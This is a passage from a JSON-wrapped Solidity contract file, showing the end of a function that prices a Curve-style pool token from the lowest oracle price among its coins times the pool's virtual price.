uint minPrice = oracleFacade.getPrice(WETH);\n        for(uint i; i<N_COINS; i++) {\n            coin = pool.coins(i);\n            if (coin != ETH) {\n                price = oracleFacade.getPrice(coin);\n                minPrice = (price < minPrice) ? price : minPrice;\n            }\n        }\n\n        return minPrice.mulWadDown(pool.get_virtual_price());\n    }\n}"
    }
  ]
}